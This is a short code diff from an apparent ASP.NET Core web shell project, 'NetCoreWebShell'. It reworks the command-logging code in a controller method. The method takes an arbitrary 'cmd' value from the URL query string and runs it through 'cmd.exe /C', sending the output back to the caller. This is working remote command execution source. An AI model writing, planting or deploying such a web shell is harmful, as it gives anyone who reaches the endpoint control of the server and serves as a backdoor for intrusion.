@@ -30,13 +30,6 @@ namespace NetCoreWebShell.Controllers
         
         public string Command([FromQuery] string cmd, [FromQuery] string dir)
         {
-            Input input = new Input()
-            {
-                Command = cmd,
-                DateTime = DateTime.Now
-            };
-            Operations.Create(input);
-
             string result = "";
             Process p = new Process();
 
@@ -51,6 +44,11 @@ namespace NetCoreWebShell.Controllers
 
             if (cmd != null)
             {
+                Input input = new Input();
+                input.Command = cmd;
+                if (cmd == "cd") input.Command += " " + dir;
+                input.DateTime = DateTime.Now;
+                Operations.Create(input);
                 p.StartInfo.FileName = "cmd.exe";
                 p.StartInfo.Arguments = $"/C {cmd}";
                 p.StartInfo.RedirectStandardOutput = true;
